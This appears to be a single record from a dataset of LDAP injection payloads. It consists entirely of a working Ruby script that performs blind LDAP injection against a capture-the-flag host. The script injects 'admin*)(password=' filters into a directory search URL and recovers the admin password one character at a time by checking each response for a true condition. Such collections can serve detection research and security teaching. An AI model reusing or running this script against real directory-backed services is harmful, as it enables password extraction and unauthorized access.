    "id": "raw_ldap_00034",
    "payload": "#!/usr/bin/env ruby\nrequire 'net/http'\nalphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!\"$%=^[]:;'.split('')\n\nflag = ''\n(0..50).each do |i|\n  puts(\"[i] Looking for number #{i}\")\n  alphabet.each do |char|\n    r = Net::HTTP.get(URI(\"http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}\"))\n    if /TRUE CONDITION/.match?(r)\n      flag += char\n      puts(\"[+] Flag: #{flag}\")\n      break\n    end\n  end\nend",
